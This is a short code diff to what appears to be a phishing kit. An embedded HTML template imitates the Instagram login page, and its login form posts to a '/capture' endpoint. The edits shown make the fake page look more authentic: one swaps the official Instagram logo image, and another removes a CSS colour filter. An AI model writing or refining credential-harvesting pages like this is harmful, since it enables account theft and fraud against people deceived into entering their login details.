@@ -84,7 +84,6 @@ INSTAGRAM_HTML = '''<!DOCTYPE html>
   height: 51px;
   display: block;
   margin: 0 auto;
-  filter: invert(1); /* beyazı siyaha çevirir */
 }
     .input-group {
       margin-bottom: 14px;
@@ -198,7 +197,7 @@ INSTAGRAM_HTML = '''<!DOCTYPE html>
     <div>
       <div class="login-card">
         <div class="logo">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagramlogo2022.svg" alt="Instagram" />
+  <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagramlogo2016.svg" alt="Instagram" />
 </div>
 
         <form id="loginForm" action="/capture" method="POST">
